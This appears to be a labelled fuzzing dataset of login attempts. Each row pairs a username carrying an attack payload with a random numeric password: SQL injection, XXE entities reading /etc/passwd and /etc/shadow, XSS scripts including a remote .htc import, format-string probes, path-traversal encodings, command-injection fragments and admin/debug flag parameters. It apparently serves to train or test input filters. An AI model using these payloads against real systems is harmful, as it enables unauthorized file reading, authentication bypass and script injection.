|{"username":"<?xml version=1.0 encoding=ISO-8859-1?><foo><![CDATA[' or 1=1 or ''=']]><\/foo>","password":"1442148493"}|,1
|{"username":"<?xml version=1.0 encoding=ISO-8859-1?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM file:\/\/c:\/boot.ini>]><foo>&xxe;<\/foo>","password":"2026626056"}|,1
|{"username":"<?xml version=1.0 encoding=ISO-8859-1?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM file:\/\/\/\/etc\/passwd>]><foo>&xxe;<\/foo>","password":"1469307613"}|,1
|{"username":"<?xml version=1.0 encoding=ISO-8859-1?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM file:\/\/\/\/etc\/shadow>]><foo>&xxe;<\/foo>","password":"165348211"}|,1
|{"username":"<?xml version=1.0 encoding=ISO-8859-1?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM file:\/\/\/\/dev\/random>]><foo>&xxe;<\/foo>","password":"394931879"}|,1
|{"username":"<xml ID=I><X><C><![CDATA[<IMG SRC=javas]]><![CDATA[cript:alert('XSS');>]]>","password":"1803332317"}|,1
|{"username":"<xml ID=xss><I><B><IMG SRC=javas<!-- -->cript:alert('XSS')><\/B><\/I><\/xml><SPAN DATASRC=#xss DATAFLD=B DATAFORMATAS=HTML><\/SPAN><\/C><\/X><\/xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><\/SPAN>","password":"227361465"}|,1
|{"username":"<xml SRC=xsstest.xml ID=I><\/xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML><\/SPAN>","password":"1324119583"}|,1
|{"username":"<HTML xmlns:xss><?import namespace=xss implementation=http:\/\/ha.ckers.org\/xss.htc><xss:xss>XSS<\/xss:xss><\/HTML>","password":"809939969"}|,1
|{"username":"%00","password":"1994698073"}|,1
|{"username":"NULL","password":"1602733308"}|,1
|{"username":"null","password":"382013104"}|,1
|{"username":"'","password":"177038976"}|,1
|{"username":"","password":"679659540"}|,1
|{"username":";","password":"1575801584"}|,1
|{"username":"<!","password":"1712829147"}|,1
|{"username":"-","password":"854028387"}|,1
|{"username":"=","password":"141487605"}|,1
|{"username":"+","password":"1612331189"}|,1
|{"username":"","password":"1621362720"}|,1
|{"username":"&","password":"864779305"}|,1
|{"username":"!","password":"673713882"}|,1
|{"username":"","password":"1440676321"}|,1
|{"username":"<","password":"187489922"}|,1
|{"username":">","password":"1971920091"}|,1
|{"username":"><script>alert(1)<\/script>","password":"1475595975"}|,1
|{"username":"%0d","password":"270164501"}|,1
|{"username":"%0a","password":"1205706764"}|,1
|{"username":"%7f","password":"49420192"}|,1
|{"username":"%ff","password":"426767095"}|,1
|{"username":"other","password":"1072539166"}|,1
|{"username":"%s%p%x%d","password":"2015061284"}|,1
|{"username":"%99999999999s","password":"206511726"}|,1
|{"username":"%08x","password":"495072567"}|,1
|{"username":"%20d","password":"1936623345"}|,1
|{"username":"%20n","password":"837071995"}|,1
|{"username":"%20x","password":"1914726603"}|,1
|{"username":"%20s","password":"1575832580"}|,1
|{"username":"%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d ","password":"86508284"}|,1
|{"username":"%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i","password":"402728678"}|,1
|{"username":"%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o","password":"505830801"}|,1
|{"username":"%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u","password":"708947355"}|,1
|{"username":"%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x","password":"2092371082"}|,1
|{"username":"%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X","password":"1974018822"}|,1
|{"username":"%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a","password":"1395066732"}|,1
|{"username":"%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A","password":"188706727"}|,1
|{"username":"%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e","password":"178932627"}|,1
|{"username":"%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E","password":"619862443"}|,1
|{"username":"%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f","password":"1479986352"}|,1
|{"username":"%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F","password":"160757322"}|,1
|{"username":"%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g","password":"1590970707"}|,1
|{"username":"%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G","password":"1063604395"}|,1
|{"username":"%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s","password":"708491617"}|,1
|{"username":"%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p","password":"1002368746"}|,1
|{"username":"%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%","password":"375142078"}|,1
|{"username":"XXXXX.%p","password":"768434611"}|,1
|{"username":"XXXXX`perl -e 'print .%p x 80'`","password":"585949735"}|,1
|{"username":"`perl -e 'print .%p x 80'`%n","password":"1281817691"}|,1
|{"username":"!'","password":"340911767"}|,1
|{"username":"!@#$%%^#$%#$@#$%$$@#$%^^**(()","password":"1066819551"}|,1
|{"username":"!@#0%^#0##018387@#0^^**(()","password":"1533167816"}|,1
|{"username":"><script>","password":"1169138348"}|,1
|{"username":">xxx<P>yyy","password":"1274699391"}|,1
|{"username":"t","password":"383172874"}|,1
|{"username":"#","password":"922158907"}|,1
|{"username":"#&apos;","password":"1735155671"}|,1
|{"username":"#'","password":"175501378"}|,1
|{"username":"#xA","password":"1829450056"}|,1
|{"username":"#xA#xD","password":"890519842"}|,1
|{"username":"#xD","password":"738729589"}|,1
|{"username":"#xD#xA","password":"1945586191"}|,1
|{"username":"$NULL","password":"1425679454"}|,1
|{"username":"$null","password":"54979321"}|,1
|{"username":"%","password":"1209602511"}|,1
|{"username":"%00","password":"1115531919"}|,1
|{"username":"%00\/","password":"155831950"}|,1
|{"username":"%01%02%03%04%0a%0d%0aADSF","password":"728826447"}|,1
|{"username":"%0a","password":"1614141146"}|,1
|{"username":"%20","password":"939906837"}|,1
|{"username":"%20","password":"1783213364"}|,1
|{"username":"%2500","password":"1296663348"}|,1
|{"username":"%250a","password":"1797785705"}|,1
|{"username":"%2A","password":"1873204059"}|,1
|{"username":"%2C","password":"2036146517"}|,1
|{"username":"%2e%2e%2f","password":"983280035"}|,1
|{"username":"%3C%3F","password":"8934771"}|,1
|{"username":"%5C","password":"1306569667"}|,1
|{"username":"%5C\/","password":"1351626627"}|,1
|{"username":"%60","password":"119930489"}|,1
|{"username":"%7C","password":"1168188734"}|,1
|{"username":"&#10;","password":"251122260"}|,1
|{"username":"&#10;&#13;","password":"632908912"}|,1
|{"username":"&#13;","password":"1234920813"}|,1
|{"username":"&#13;&#10;","password":"1167172380"}|,1
|{"username":"&apos;","password":"1017044509"}|,1
|{"username":"&quot;;id&quot;","password":"1484176100"}|,1
|{"username":"(')","password":"1581731611"}|,1
|{"username":"*","password":"1709198208"}|,1
|{"username":"*&apos;","password":"1051859915"}|,1
|{"username":"*'","password":"1807394708"}|,1
|{"username":"*","password":"13205349"}|,1
|{"username":"+%00","password":"496966218"}|,1
|{"username":"-","password":"1876826248"}|,1
|{"username":"--","password":"741256763"}|,1
|{"username":"-1.0","password":"362654778"}|,1
|{"username":"..%%35%63","password":"165291253"}|,1
|{"username":"..%%35c","password":"1008625074"}|,1
|{"username":"..%25%35%63","password":"1646372753"}|,1
|{"username":"..%255c","password":"2034320474"}|,1
|{"username":"..%5c","password":"219310128"}|,1
|{"username":"..%bg%qf","password":"39608164"}|,1
|{"username":"..%c0%af","password":"1119292236"}|,1
|{"username":"..%u2215","password":"341910854"}|,1
|{"username":"..%u2216","password":"705182050"}|,1
|{"username":"..\/","password":"1917639850"}|,1
|{"username":"..","password":"1882865758"}|,1
|{"username":"\/","password":"1443417936"}|,1
|{"username":"\/%00\/","password":"1386036521"}|,1
|{"username":"\/%2A","password":"1547376486"}|,1
|{"username":"\/&apos;","password":"913224136"}|,1
|{"username":"\/'","password":"428586004"}|,1
|{"username":"0xfffffff","password":"971358398"}|,1
|{"username":"1.0","password":"1709519567"}|,1
|{"username":";","password":"1869814755"}|,1
|{"username":"<  script > < \/ script>","password":"487607329"}|,1
|{"username":"<?","password":"1312677279"}|,1
|{"username":"?x=","password":"190758641"}|,1
|{"username":"?x=","password":"1035290588"}|,1
|{"username":"?x=>","password":"192558002"}|,1
|{"username":"?x=","password":"1778839466"}|,1
|{"username":"@&apos;","password":"721583986"}|,1
|{"username":"@'","password":"1167111886"}|,1
|{"username":"A","password":"562281231"}|,1
|{"username":"ABCD%8.8x%8.8x%8.8x%8.8x%8.8x%8.8x%8.8x%8.8x%8.8x%8.8x","password":"1279995776"}|,1
|{"username":"FALSE","password":"1770008015"}|,1
|{"username":"NULL","password":"799697130"}|,1
|{"username":"TRUE","password":"2068443104"}|,1
|{"username":"[&apos;]","password":"1131947296"}|,1
|{"username":"[']","password":"1673491739"}|,1
|{"username":"","password":"817988782"}|,1
|{"username":"blah","password":"1147793344"}|,1
|{"username":"&apos;","password":"1807680561"}|,1
|{"username":"'","password":"1464789800"}|,1
|{"username":"","password":"2048104008"}|,1
|{"username":"\/","password":"1128580570"}|,1
|{"username":"*","password":"1279313671"}|,1
|{"username":"?","password":"290998058"}|,1
|{"username":"t","password":"529738763"}|,1
|{"username":"^&apos;","password":"1397016177"}|,1
|{"username":"^'","password":"1281662398"}|,1
|{"username":"`","password":"40758164"}|,1
|{"username":"id%00","password":"195695090"}|,1
|{"username":"id%00","password":"161821722"}|,1
|{"username":"null","password":"138635779"}|,1
|{"username":"something%00html","password":"1378808704"}|,1
|{"username":"{&apos;}","password":"1189330598"}|,1
|{"username":"{'}","password":"934930298"}|,1
|{"username":"","password":"7011493"}|,1
|{"username":"}","password":"253649434"}|,1
|{"username":"7357=1","password":"1197461146"}|,1
|{"username":"7357=true","password":"2122016259"}|,1
|{"username":"7357=y","password":"2120818133"}|,1
|{"username":"7357=yes","password":"1453814751"}|,1
|{"username":"access=1","password":"255481008"}|,1
|{"username":"access=true","password":"1645209789"}|,1
|{"username":"access=y","password":"1019979925"}|,1
|{"username":"access=yes","password":"557011005"}|,1
|{"username":"adm=1","password":"1209398725"}|,1
|{"username":"adm1n=1","password":"1082657682"}|,1
|{"username":"adm1n=true","password":"1117942720"}|,1
|{"username":"adm1n=y","password":"1961906301"}|,1
|{"username":"adm1n=yes","password":"311470640"}|,1
|{"username":"admin=1","password":"1860028429"}|,1
|{"username":"admin=true","password":"729387704"}|,1
|{"username":"admin=y","password":"1912914439"}|,1
|{"username":"admin=yes","password":"768389090"}|,1
|{"username":"adm=true","password":"1654052245"}|,1
|{"username":"adm=y","password":"1808899206"}|,1
|{"username":"adm=yes","password":"741234185"}|,1
|{"username":"dbg=1","password":"1355777305"}|,1
|{"username":"dbg=true","password":"1021679221"}|,1
|{"username":"dbg=y","password":"1808503525"}|,1
|{"username":"dbg=yes","password":"1785758058"}|,1
|{"username":"debug=1","password":"1058379251"}|,1
|{"username":"debug=true","password":"1738081302"}|,1
|{"username":"debug=y","password":"525888896"}|,1
|{"username":"debug=yes","password":"1005290164"}|,1
|{"username":"edit=1","password":"423645452"}|,1
|{"username":"edit=true","password":"2048670719"}|,1
|{"username":"edit=y","password":"580677417"}|,1
|{"username":"edit=yes","password":"2012250479"}|,1
|{"username":"grant=1","password":"2061431611"}|,1
|{"username":"grant=true","password":"878297862"}|,1
|{"username":"grant=y","password":"476030593"}|,1
|{"username":"grant=yes","password":"843456170"}|,1
|{"username":"test=1","password":"1174458858"}|,1
|{"username":"test=true","password":"353865810"}|,1
|{"username":"test=y","password":"1209308792"}|,1
|{"username":"test=yes","password":"402894219"}|,1
|{"username":"add","password":"108600645"}|,1
|{"username":"admin","password":"722302666"}|,1
|{"username":"alert","password":"1229082980"}|,1
|{"username":"alter","password":"1594564728"}|,1
|{"username":"auth","password":"279073457"}|,1
|{"username":"authenticate","password":"1467239744"}|,1
|{"username":"append","password":"1876771171"}|,1
|{"username":"calc","password":"483150308"}|,1
|{"username":"calculate","password":"1579917665"}|,1
|{"username":"cancel","password":"373204987"}|,1
|{"username":"change","password":"610419614"}|,1
|{"username":"check","password":"1682762000"}|,1
|{"username":"clear","password":"1273514739"}|,1
|{"username":"click","password":"1413260955"}|,1
|{"username":"clone","password":"1045355776"}|,1
|{"username":"close","password":"175781925"}|,1
|{"username":"create","password":"313512734"}|,1
|{"username":"crypt","password":"335060075"}|,1
|{"username":"decrypt","password":"395435500"}|,1
|{"username":"del","password":"664883353"}|,1
|{"username":"delete","password":"1119320893"}|,1
|{"username":"demo","password":"14689761"}|,1
|{"username":"disable","password":"133365553"}|,1
|{"username":"dl","password":"1308211653"}|,1
|{"username":"download","password":"501980265"}|,1
|{"username":"edit","password":"1253175888"}|,1
|{"username":"enable","password":"2047958337"}|,1
|{"username":"encrypt","password":"1580656425"}|,1
|{"username":"exec","password":"1383997836"}|,1
|{"username":"execute","password":"2033415181"}|,1
|{"username":"file","password":"738455581"}|,1
|{"username":"focus","password":"414523280"}|,1
|{"username":"get","password":"444743453"}|,1
|{"username":"help","password":"1406004987"}|,1
|{"username":"initiate","password":"632633540"}|,1
|{"username":"is","password":"633474639"}|,1
|{"username":"list","password":"1940079888"}|,1
|{"username":"load","password":"213938797"}|,1
|{"username":"ls","password":"1506684601"}|,1
|{"username":"make","password":"1738623154"}|,1
|{"username":"mod","password":"2008793778"}|,1
|{"username":"mode","password":"42738588"}|,1
|{"username":"modify","password":"1572856146"}|,1
|{"username":"move","password":"50440465"}|,1
|{"username":"new","password":"1438251105"}|,1
|{"username":"off","password":"1045399064"}|,1
|{"username":"on","password":"738735740"}|,1
|{"username":"open","password":"648170656"}|,1
|{"username":"post","password":"1980425733"}|,1
|{"username":"proxy","password":"300248668"}|,1
|{"username":"pull","password":"529943436"}|,1
|{"username":"put","password":"839398783"}|,1
|{"username":"query","password":"2105913957"}|,1
|{"username":"read","password":"544425439"}|,1
|{"username":"remove","password":"1431056973"}|,1
|{"username":"rename","password":"93910884"}|,1
|{"username":"reset","password":"588937113"}|,1
|{"username":"retrieve","password":"2068354974"}|,1
|{"username":"run","password":"1092584463"}|,1
|{"username":"save","password":"1173381216"}|,1
|{"username":"search","password":"1566765054"}|,1
|{"username":"send","password":"296114746"}|,1
|{"username":"shell","password":"1246636119"}|,1
|{"username":"show","password":"1693986131"}|,1
|{"username":"snd","password":"1782233053"}|,1
|{"username":"subtract","password":"195896334"}|,1
|{"username":"test","password":"1238018547"}|,1
|{"username":"to","password":"2014993399"}|,1
|{"username":"toggle","password":"780627415"}|,1
|{"username":"update","password":"411881137"}|,1
|{"username":"upload","password":"383185684"}|,1
|{"username":"verify","password":"99573937"}|,1
|{"username":"view","password":"975859121"}|,1
|{"username":"vrfy","password":"804295993"}|,1
|{"username":"with","password":"803573222"}|,1
|{"username":"7357:1","password":"1076582305"}|,1
|{"username":"7357:true","password":"589317262"}|,1
|{"username":"7357:y","password":"82925088"}|,1
|{"username":"7357:yes","password":"2017444195"}|,1
|{"username":"access:1","password":"1604064848"}|,1
|{"username":"access:true","password":"514440148"}|,1
|{"username":"access:y","password":"1399787681"}|,1
|{"username":"access:yes","password":"1747714339"}|,1
|{"username":"adm:1","password":"1083749168"}|,1
|{"username":"adm:true","password":"1503471745"}|,1
|{"username":"adm:y","password":"2046540445"}|,1
|{"username":"adm:yes","password":"456092970"}|,1
|{"username":"adm1n:1","password":"2047801661"}|,1
|{"username":"adm1n:true","password":"2122431661"}|,1
|{"username":"adm1n:y","password":"538722656"}|,1
|{"username":"adm1n:yes","password":"44537526"}|,1
|{"username":"admin:1","password":"2019208561"}|,1
|{"username":"admin:true","password":"1268837981"}|,1
|{"username":"admin:y","password":"333303385"}|,1
|{"username":"admin:yes","password":"171858100"}|,1
|{"username":"adm:1","password":"1712679032"}|,1
|{"username":"adm:true","password":"943586116"}|,1
|{"username":"adm:y","password":"2026353662"}|,1
|{"username":"adm:yes","password":"415691059"}|,1
|{"username":"dbg:1","password":"1242354771"}|,1
|{"username":"dbg:true","password":"1954864164"}|,1
|{"username":"dbg:y","password":"871225988"}|,1
|{"username":"dbg:yes","password":"2015026888"}|,1
|{"username":"debug:1","password":"1568544596"}|,1
|{"username":"debug:true","password":"2064546631"}|,1
|{"username":"debug:y","password":"430369499"}|,1
|{"username":"debug:yes","password":"2011023309"}|,1
|{"username":"edit:1","password":"1301617964"}|,1
|{"username":"edit:true","password":"1888335864"}|,1
|{"username":"edit:y","password":"354474668"}|,1
|{"username":"edit:yes","password":"1652077269"}|,1
|{"username":"grant:1","password":"506012025"}|,1
